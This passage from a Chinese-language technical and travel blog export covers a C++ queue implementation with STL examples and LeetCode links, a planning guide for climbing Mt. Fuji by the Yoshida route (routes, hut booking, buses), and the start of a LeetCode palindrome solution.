class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QueueList</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> front, back;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; queue;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">QueueList</span>():<span class="built_in">front</span>(<span class="literal">NULL</span>), <span class="built_in">back</span>(<span class="literal">NULL</span>), <span class="built_in">queue</span>(<span class="literal">NULL</span>)&#123;&#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(<span class="type">int</span> x)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getFront</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getBack</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getSize</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">IsEmpty</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QueueList::Push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    queue.<span class="built_in">push_back</span>(x);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QueueList::Pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(queue.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;empty queue&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        queue.<span class="built_in">erase</span>(queue.<span class="built_in">begin</span>());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">QueueList::getFront</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(queue.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;empty queue&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt;::iterator it=queue.<span class="built_in">begin</span>();</span><br><span class="line">        <span class="keyword">return</span> *it;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">QueueList::getBack</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(queue.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;empty queue&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt;::iterator it=queue.<span class="built_in">end</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">return</span> *it;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">QueueList::getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> queue.<span class="built_in">size</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">QueueList::IsEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(queue.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    QueueList q;</span><br><span class="line">    q.<span class="built_in">Push</span>(<span class="number">25</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;After Pushing 25: &quot;</span> &lt;&lt; <span class="string">&quot;front:&quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot; back:&quot;</span> &lt;&lt;  q.<span class="built_in">getBack</span>() &lt;&lt; endl;</span><br><span class="line">    q.<span class="built_in">Push</span>(<span class="number">50</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;After Pushing 50: &quot;</span> &lt;&lt; <span class="string">&quot;front:&quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot; back:&quot;</span> &lt;&lt;  q.<span class="built_in">getBack</span>() &lt;&lt; endl;</span><br><span class="line">    q.<span class="built_in">Push</span>(<span class="number">77</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;After Pushing 77: &quot;</span> &lt;&lt; <span class="string">&quot;front:&quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot; back:&quot;</span> &lt;&lt;  q.<span class="built_in">getBack</span>() &lt;&lt; endl;</span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;After Poping the front element: &quot;</span> &lt;&lt; <span class="string">&quot;front:&quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot; back:&quot;</span> &lt;&lt;  q.<span class="built_in">getBack</span>() &lt;&lt; endl;</span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;After Poping the front element: &quot;</span> &lt;&lt; <span class="string">&quot;front:&quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot; back:&quot;</span> &lt;&lt;  q.<span class="built_in">getBack</span>() &lt;&lt; endl;</span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;After Poping the front element: &quot;</span> &lt;&lt; <span class="string">&quot;front:&quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot; back:&quot;</span> &lt;&lt;  q.<span class="built_in">getBack</span>() &lt;&lt; endl;</span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;After Poping the front element: &quot;</span> &lt;&lt; <span class="string">&quot;front:&quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot; back:&quot;</span> &lt;&lt;  q.<span class="built_in">getBack</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>輸出結果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">After Pushing 25: front:25 back:25</span><br><span class="line">After Pushing 50: front:25 back:50</span><br><span class="line">After Pushing 77: front:25 back:77</span><br><span class="line">After Poping the front element: front:50 back:77</span><br><span class="line">After Poping the front element: front:77 back:77</span><br><span class="line">empty queue</span><br><span class="line">empty queue</span><br><span class="line">After Poping the front element: front:-1 back:-1</span><br></pre></td></tr></table></figure><h1 id="Queue-相關-STL"><a href="#Queue-相關-STL" class="headerlink" title="Queue 相關 STL"></a>Queue 相關 STL</h1><p>C++ 中對於 queue也有現成的STL可以使用，使用前會需要先宣告 <code>&lt;queue&gt;</code>，以下是常見的成員函式:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="number">1</span>);</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="number">2</span>);</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; q.<span class="built_in">front</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; q.<span class="built_in">back</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; q.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// copy the queue</span></span><br><span class="line">    <span class="type">int</span> a = q.<span class="built_in">front</span>();</span><br><span class="line">    <span class="type">int</span> &amp;b = q.<span class="built_in">front</span>();</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; q.<span class="built_in">front</span>() &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; &amp;q.<span class="built_in">front</span>() &lt;&lt; endl; <span class="comment">// print the memory </span></span><br><span class="line">    cout &lt;&lt; a &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; &amp;a &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; b &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; &amp;b &lt;&lt; endl; <span class="comment">// same as memory addr of q.front()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// print the  queue contents</span></span><br><span class="line">    <span class="type">int</span> size = q.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        cout &lt;&lt; q.<span class="built_in">front</span>() &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>輸出結果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">3</span><br><span class="line">3</span><br><span class="line">1 0x76fc70</span><br><span class="line">1 0x7ffc0ddca00c</span><br><span class="line">1 0x76fc70</span><br><span class="line">1 2 3 </span><br></pre></td></tr></table></figure><blockquote><p>各類資料結構的STL可以參考我整理的 <strong><a href="https://leozzmc.github.io/posts/efa232a7.html">這篇</a></strong></p></blockquote><h1 id="Queue-操作的時間複雜度"><a href="#Queue-操作的時間複雜度" class="headerlink" title="Queue 操作的時間複雜度"></a>Queue 操作的時間複雜度</h1><p>插入和刪除的時間複雜度都是 $O(1)$，而搜尋和存取的時間複雜度都是 $O(N)$</p><h1 id="Queue-相關-LeetCode-題目"><a href="#Queue-相關-LeetCode-題目" class="headerlink" title="Queue 相關 LeetCode 題目"></a>Queue 相關 LeetCode 題目</h1><p>Easy</p><ul><li><a href="https://leetcode.com/problems/implement-stack-using-queues/description/">225. Implement Stack using Queues</a></li><li><a href="https://leetcode.com/problems/implement-queue-using-stacks/description/">232. Implement Queue using Stacks</a></li></ul><p>Medium</p><ul><li><a href="https://leetcode.com/problems/reveal-cards-in-increasing-order/description/">950. Reveal Cards In Increasing Order</a></li><li><a href="https://leetcode.com/problems/design-circular-deque/description/">641. Design Circular Deque</a></li><li><a href="https://leetcode.com/problems/design-circular-queue/description/">622. Design Circular Queue</a></li></ul><p>Hard</p><ul><li><a href="https://leetcode.com/problems/count-subarrays-with-fixed-bounds/description/">2444. Count Subarrays With Fixed Bounds</a></li></ul><h1 id="參考"><a href="#參考" class="headerlink" title="參考"></a>參考</h1><p>[1] <a href="https://ithelp.ithome.com.tw/articles/10326158">https://ithelp.ithome.com.tw/articles/10326158</a><br>[2] <a href="https://alrightchiu.github.io/SecondRound/queue-introjian-jie-bing-yi-linked-listshi-zuo.html">https://alrightchiu.github.io/SecondRound/queue-introjian-jie-bing-yi-linked-listshi-zuo.html</a><br>[3] <a href="https://alrightchiu.github.io/SecondRound/queue-yi-arrayshi-zuo-queue.html">https://alrightchiu.github.io/SecondRound/queue-yi-arrayshi-zuo-queue.html</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Queue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攀登富士山 | 行前準備與規劃紀錄 | 山屋預約</title>
      <link href="/posts/f9156e74.html"/>
      <url>/posts/f9156e74.html</url>
      
        <content type="html"><![CDATA[<h1 id="富士山之旅"><a href="#富士山之旅" class="headerlink" title="富士山之旅"></a>富士山之旅</h1><p>由於搶到御來光館的日期是在 7&#x2F;16，因此這次攀登富士山的日期就選擇在今年(2024) 的 7&#x2F;16 -7&#x2F;17。 <strong>攀爬富士山大多都是呼籲預約山小屋，不要夜間單攻(彈丸登山)</strong> ，因此這次也是先以山屋預約日期為主，再去安排對應的爬山行程。另外富士山是一座活火山，隨時要注意火山活動相關的警報，這部分可以去<a href="https://www.fujisan-climb.jp/index.html">富士山的官網查閱</a>。</p><p><img src="/img/Mountain/Mt.Fuji/notice.jpeg"></p><h1 id="攀登路線"><a href="#攀登路線" class="headerlink" title="攀登路線"></a>攀登路線</h1><h3 id="吉田路線"><a href="#吉田路線" class="headerlink" title="吉田路線"></a>吉田路線</h3><p>從富士山五合目出發，海拔為2300公尺，登山路線：5.8 公里。約耗時 5-7 個小時，也是山屋最多的路線，從7合目到9合目都有山屋，因此算是熱門的新手路線。也是我們這次的攀爬路線。</p><p><img src="/img/Mountain/Mt.Fuji/path1.jpg"></p><blockquote><p>圖源:<a href="https://www.fujisan-climb.jp/trails/yoshida/index.html">https://www.fujisan-climb.jp/trails/yoshida/index.html</a></p></blockquote><p>除了吉田路線之外富士山還有其他攀登路線</p><h3 id="須走路線"><a href="#須走路線" class="headerlink" title="須走路線"></a>須走路線</h3><p>吉田路線跟須走路線在本八合目後就會交會，因此人潮會開始便更多。這個路線最大的樂趣就是可以在下山途中體驗砂走，也就是在沙中滑行，實際上吉田路線的下山道也必須先從須走路線開始走，大概走道八合目才會又岔開</p><p><img src="/img/Mountain/Mt.Fuji/path3.jpg"></p><blockquote><p>圖源: <a href="https://www.fujisan-climb.jp/trails/subashiri/index.html">https://www.fujisan-climb.jp/trails/subashiri/index.html</a></p></blockquote><blockquote><p>如果想了解須走路線的攀爬心得，這篇寫得挺完整: <a href="https://manyujp.com/fujisan-1/">https://manyujp.com/fujisan-1/</a></p></blockquote><h3 id="富士宮路線"><a href="#富士宮路線" class="headerlink" title="富士宮路線"></a>富士宮路線</h3><p>距離最短的路線，但會是一路陡上，建議有許多登山經驗者前往</p><p><img src="/img/Mountain/Mt.Fuji/path2.jpg"></p><blockquote><p>圖源: <a href="https://www.fujisan-climb.jp/trails/fujinomiya/index.html">https://www.fujisan-climb.jp/trails/fujinomiya/index.html</a></p></blockquote><h3 id="御殿場路線"><a href="#御殿場路線" class="headerlink" title="御殿場路線"></a>御殿場路線</h3><p>坡度最平緩，也可以體驗砂走，山屋，廁所都較少。但登山者也最少</p><p><img src="/img/Mountain/Mt.Fuji/path4.jpg"></p><blockquote><p>圖源: <a href="https://www.fujisan-climb.jp/trails/gotenba/index.html">https://www.fujisan-climb.jp/trails/gotenba/index.html</a></p></blockquote><h1 id="入山申請"><a href="#入山申請" class="headerlink" title="入山申請"></a>入山申請</h1><p>自2024年7月1日起，山梨縣針對攀登吉田路線的山友收取每人2000日圓的入山通行費，並僅開放每日僅4000人攀登富士山。</p><p><img src="/img/Mountain/Mt.Fuji/admission.jpeg"></p><blockquote><p>圖源: <a href="https://www.fujisan-climb.jp/info/20240220_2024anzentaisaku.html">https://www.fujisan-climb.jp/info/20240220_2024anzentaisaku.html</a></p></blockquote><h1 id="山屋預約"><a href="#山屋預約" class="headerlink" title="山屋預約"></a>山屋預約</h1><p><img src="/img/Mountain/Mt.Fuji/house.jpg"></p><p>富士山不同路線也有不同的山小屋，吉田路線算是有最多山小屋的路線，從七合目到本八合目都有山屋，下面是整理吉田路線上的山屋列表</p><table>    <tr>        <th>幾合目</th>        <th>山小屋名稱</th>        <th>官網</th>      </tr >    <tr >        <td rowspan="7">八合目</td>        <td>御来光館</td>        <td><a href="https://www.goraikoukan.jp"> https://www.goraikoukan.jp </td>    </tr>    <tr>        <td>八合目トモエ館</td>        <td><a href="https://tomoekan.com">https://tomoekan.com</td>    </tr>    <tr>        <td>富士山ホテル</td>        <td><a href="https://www.fujisanhotel.com/">https://www.fujisanhotel.com/</td>    </tr>    <tr>        <td>元祖室</td>        <td><a href="https://www.ganso-muro.jp/">https://www.ganso-muro.jp/</td>    </tr>    <tr><td>白雲荘</td>        <td><a href="http://fujisan-hakuun.com/en/">http://fujisan-hakuun.com/en/</td>    </tr>    <tr>        <td>蓬莱館</td>        <td><a href="https://www.horaikan.jp/">https://www.horaikan.jp/</td>    </tr>    <tr>        <td>太子舘</td>        <td><a href="https://www.mfi.or.jp/~taisikan/">https://www.mfi.or.jp/~taisikan/</td>    </tr>    <tr >        <td rowspan="5">七合目</td>        <td>東洋館</td>        <td><a href="https://www.fuji-toyokan.jp/">https://www.fuji-toyokan.jp/</td>    </tr>    <tr>        <td>鳥居荘</td>        <td><a href="http://toriiso.com/">http://toriiso.com/</td>    </tr>    <tr>        <td>富士一館</td>        <td><a href="https://www.fuji-ichikan.jp/">https://www.fuji-ichikan.jp/</td>    </tr>    <tr>        <td>鎌岩館</td>        <td><a href="https://kamaiwakan.jpn.org/">https://kamaiwakan.jpn.org/</td>    </tr>    <tr>        <td>七合目トモエ館</td>        <td><a href="https://kamaiwakan.jpn.org/">https://kamaiwakan.jpn.org/</td>    </tr></table><div class="note warning flat"><p><strong>根據經驗，許多山屋預約會提前偷跑!!! 例如如果官網上寫 5&#x2F;20 23:00 開放預約，由於這是日本時間，按理說台灣會是 22:00 開始能夠預約，但這次我們四個人分工搶山屋的時候發現早在21:00　某些山屋就提前放行預約了！！！甚至某些要後面幾天才能夠預約的山屋也在前幾天就偷偷開放了！！！因此務必要提前再提前做好搶山屋的準備</strong></p></div><h2 id="御來光館預約"><a href="#御來光館預約" class="headerlink" title="御來光館預約"></a>御來光館預約</h2><p>這次御來光館是在今年的 5&#x2F;7 中午開放預約，我在公司透過公司的網速奮力地搶到了與同行友人的四人住宿房。真的是萬幸，並且在靠近開放時間前網站會瘋狂 timeout。</p><p>通常在開放預約後可以點選網站旁邊的 <strong>ご予約／ご宿泊</strong> 就會跳出可供預約的日期，有圈圈的就代表有位子，但因為真的很難槍，所以一定要瘋狂重新整理看看是否有位置，另外進去後會需要選擇幾人床位，並且要填寫像是在日本的聯絡地址以及一些個人基本資料，建議都先準備好再來開搶。</p><p><img src="/img/Mountain/Mt.Fuji/goraikoukan.png"></p><p>另外我們這次是選擇一泊二食，也就是會有晚餐跟隔日的早餐。餐點在預定時可以選擇西式或者日式餐點。</p><p><img src="/img/Mountain/Mt.Fuji/food.jpeg"></p><p><img src="/img/Mountain/Mt.Fuji/dinner.jpeg"><br>晚餐會在下午 5:00 開始陸續供應<br><img src="/img/Mountain/Mt.Fuji/breakfest.jpeg"></p><p>早餐會在隔天早上 1:30 就先準備好。</p><div class="note info flat"><p><strong>開放Check-In 時間:</strong> 14:00 後<br><strong>Check-Out 時間:</strong> 0:00 ~ 6:00<br><strong>取消政策: 如果因為個人原因取消山屋，則會被收取取消費用</strong><br><strong>不住宿</strong>　：　100%<br><strong>當日</strong>　：　100%<br><strong>前日</strong>　：　 80%<br><strong>9日前</strong>　：　 50%<br><strong>20日前</strong>　：　 30%</p><p>如果吉田路線在入住當天關閉，或者如果山梨縣或靜岡縣指示您禁止登山，則免除取消費用。</p></div><h1 id="交通安排"><a href="#交通安排" class="headerlink" title="交通安排"></a>交通安排</h1><p>這次選擇先抵達河口湖過夜，隔日早晨再從河口湖出發五合目</p><h2 id="成田機場-→-新宿"><a href="#成田機場-→-新宿" class="headerlink" title="成田機場 → 新宿"></a>成田機場 → 新宿</h2><p>我自己是搭乘京成特快 NEX，可以先用 Klook 或者 KKday 先買好，取得QR Code，再去機場的NEX機台兌換。</p><p><img src="/img/Mountain/Mt.Fuji/nex.jpg"></p><h2 id="新宿-→-河口湖"><a href="#新宿-→-河口湖" class="headerlink" title="新宿 → 河口湖"></a>新宿 → 河口湖</h2><p>接著就是搭乘高速巴士到河口湖站過夜，有事先在高速巴士網站上預約新宿車站到河口湖站的車票</p><p>行動車票會像是下面這樣，再交給乘務員掃瞄檢查即可上車<br><img src="/img/Mountain/Mt.Fuji/highwaybus.jpeg"></p><blockquote><p>高速巴士網站: <a href="https://highway-buses.jp/chi/">https://highway-buses.jp/chi/</a></p></blockquote><h2 id="河口湖-→-五合目"><a href="#河口湖-→-五合目" class="headerlink" title="河口湖 → 五合目"></a>河口湖 → 五合目</h2><p>可以線上預約車票，第一班車，在使用車票時，可以點選啟用票券，<strong>建議等車到再點選啟用，啟用後會開始倒數計時兩小時，兩小時候票券會作廢。</strong></p><p><img src="/img/Mountain/Mt.Fuji/fujikyubus.png"></p><p>河口湖站的候車地點會是在 7號站牌。</p><p><img src="/img/Mountain/Mt.Fuji/bustop.jpg"></p><blockquote><p>接駁巴士車票預約: <a href="https://fujikyubus.quicktrip.jp/bought">https://fujikyubus.quicktrip.jp/bought</a></p></blockquote><p>如果要去富士山五合目，一定要注意時間，我們去是趕第一班 6:40分的車，但巴士遲到了一下，到達五合目大概是7:45左右</p><p><img src="/img/Mountain/Mt.Fuji/time.jpeg"></p><blockquote><p>富士巴士時刻表: <a href="https://www.fujikyubus.co.jp/mycar/timetablefares/">https://www.fujikyubus.co.jp/mycar/timetablefares/</a></p></blockquote><p><img src="/img/Mountain/Mt.Fuji/5stage.jpg"></p><p>題外話，第一天起登到御來光館起大霧跟暴雨，十分狼狽的一天，雨衣雨褲，防寒衣物務必要準備好，上山路上看到許多穿短袖短褲快冷死的外國人….，登山分享可能之後再整理XD</p><p>另外，去跟回的車票可以一次買，但回程到河口湖的巴士建議爬完後再買，除非你很能控制上下山的時間，下山後也可以去神社或者旁邊的紀念品店晃晃~</p><h1 id="參考"><a href="#參考" class="headerlink" title="參考"></a>參考</h1><p>完整的富士路線地圖(pdf檔)- <a href="https://www.fujisan-climb.jp/tc/b2rg1t00000018zh-att/map_tc.pdf">https://www.fujisan-climb.jp/tc/b2rg1t00000018zh-att/map_tc.pdf</a></p>]]></content>
      
      
      <categories>
          
          <category> 爬山健行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Travel </tag>
            
            <tag> Mountain </tag>
            
            <tag> hiking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有效回文 | Easy | LeetCode#125. Valid Palindrome</title>
      <link href="/posts/7abe6380.html"/>
      <url>/posts/7abe6380.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/125/question.jpeg"></p><p><img src="/img/LeetCode/125/question2.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 題目給定字串 <code>s</code>，當你把字串中的大寫字母轉換成小寫字母，並且把所有非字母或數字類的符號去除，如果從頭讀到尾跟從尾讀到頭都是一樣的字串，那就是一個有效的 <strong>回文(Palindrome)</strong> ，若回文有效就返回 true，反之則 false，<code>s</code> 僅包含ASCII當中可印出的符號。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><ul><li>先將題目字串 <code>s</code> 中的大寫字母轉為小寫，並且將其餘符號去除</li><li>這部分可以宣告一個新的空字串，並且分別處理數字、大寫字母以及小寫字母</li><li>接著就是判斷回文，可透過迴圈同時檢查字串的頭跟尾是否一樣，若有發現不一致則回傳false，反之則True</li><li>頭尾pointer僅需scan到字串的中間即可</li></ul><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">bool</span> isPalindrome = <span class="literal">false</span>;</span><br><span class="line">        string tempStr=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(s.<span class="built_in">size</span>()==<span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c:s)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c &gt;= <span class="number">48</span> &amp;&amp; c&lt;=<span 